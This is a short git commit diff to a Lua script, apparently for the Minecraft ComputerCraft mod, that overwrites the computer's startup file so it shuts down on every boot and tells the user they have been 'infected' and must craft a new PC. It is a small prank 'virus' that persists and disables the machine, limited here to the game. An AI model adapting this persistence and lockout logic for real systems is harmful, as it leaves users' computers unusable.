951d7cf44d750a53d14d25936cb8c9b9892840a0
Tobiaszeqq <138253740+Tobiaszeqq@users.noreply.github.com>
2024-12-28 23:48:28 +0100

    Update shutdownLoop.lua

--- shutdownLoop.lua
+++ shutdownLoop.lua
@@ -5,7 +5,7 @@ os.shutdown()
 
 -- Edit startup.lua
 local file = fs.open("startup", "w")
-file.write(rebootLoop)
+file.write(shutdownLoop)
 file.close()
 term.clear()
 print("you've been infected shutdown loop, your pc is gonna restart in 3 seconds and its going to be in shutdown loop. craft a new pc")
